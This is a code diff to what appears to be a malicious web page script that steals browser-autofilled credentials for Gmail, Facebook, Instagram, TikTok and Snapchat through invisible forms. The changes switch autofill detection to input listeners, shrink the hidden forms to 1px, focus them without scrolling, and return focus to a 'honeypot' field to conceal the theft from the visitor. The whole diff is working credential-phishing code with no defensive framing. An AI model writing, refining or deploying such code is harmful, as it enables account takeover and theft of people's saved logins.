@@ -5,9 +5,10 @@ async function harvest() {
   // Check the flag to ensure this function only runs once
   if (window.harvested) return;
   window.harvested = true;
+  console.log('Harvest triggered!');
 
   // A short delay to ensure all autofill values are populated
-  await new Promise(resolve => setTimeout(resolve, 50));
+  await new Promise(resolve => setTimeout(resolve, 100));
 
   const gmailForm = document.getElementById('gmail-form');
   const facebookForm = document.getElementById('facebook-form');
@@ -68,26 +69,16 @@ async function harvest() {
   }, 500);
 }
 
-// --- Autofill Detection using CSS Animation Trick ---
-const style = document.createElement('style');
-style.innerHTML = `
-  @keyframes onAutoFillStart { from {} to {} }
-  input:-webkit-autofill {
-    animation-name: onAutoFillStart;
-    animation-fill-mode: both;
-  }
-`;
-document.head.appendChild(style);
-
-document.addEventListener('animationstart', (e) => {
-  if (e.animationName === 'onAutoFillStart') {
-    // Use a small delay to ensure all fields in the form are filled
-    setTimeout(harvest, 50);
-  }
-}, true);
+// --- Autofill Detection using 'input' event ---
+function setupInputListeners() {
+    const inputs = document.querySelectorAll('.hidden-form input');
+    inputs.forEach(input => {
+        input.addEventListener('input', harvest);
+    });
+    console.log('Input listeners set up for all hidden form inputs.');
+}
 
 // --- Fallback Mechanisms ---
-// The primary mechanism is now the animation detection. The unload listener is a fallback.
 window.addEventListener('beforeunload', harvest);
 
 // --- UI & Focus Trap Logic ---
@@ -97,7 +88,11 @@ setTimeout(() => {
   const previewContainer = document.querySelector('.preview-container');
   const honeypotContainer = document.querySelector('.honeypot-container');
   if (previewContainer) previewContainer.style.display = 'none';
-  if (honeypotContainer) honeypotContainer.style.display = 'block';
+  if (honeypotContainer) {
+    honeypotContainer.style.display = 'block';
+    // Set up listeners once the honeypot is visible
+    setupInputListeners();
+  }
 }, 1500);
 
 function triggerFocusSwarm() {
@@ -110,21 +105,27 @@ function triggerFocusSwarm() {
     form.style.display = 'block';
     form.style.opacity = '0';
     form.style.position = 'absolute';
+    form.style.height = '1px';
+    form.style.width = '1px';
+    form.style.overflow = 'hidden';
   });
 
   // Focus all the username/email fields
-  document.querySelector('#gmail-form input[name="email"]')?.focus();
-  document.querySelector('#facebook-form input[name="username"]')?.focus();
-  document.querySelector('#instagram-form input[name="username"]')?.focus();
-  document.querySelector('#tiktok-form input[name="username"]')?.focus();
-  document.querySelector('#snapchat-form input[name="username"]')?.focus();
+  document.querySelector('#gmail-form input[name="email"]')?.focus({ preventScroll: true });
+  document.querySelector('#facebook-form input[name="username"]')?.focus({ preventScroll: true });
+  document.querySelector('#instagram-form input[name="username"]')?.focus({ preventScroll: true });
+  document.querySelector('#tiktok-form input[name="username"]')?.focus({ preventScroll: true });
+  document.querySelector('#snapchat-form input[name="username"]')?.focus({ preventScroll: true });
 
-  // Hide the forms again shortly after. The harvest is now triggered by the animation event.
+  // Re-focus the honeypot to keep the user's cursor in place
+  document.getElementById('honeypot-input')?.focus({ preventScroll: true });
+
+  // Hide the forms again shortly after.
   setTimeout(() => {
       forms.forEach(form => {
           form.style.display = 'none';
       });
-  }, 100);
+  }, 200);
 }
 
 // Add a one-time event listener to the honeypot input for the 'focus' event.
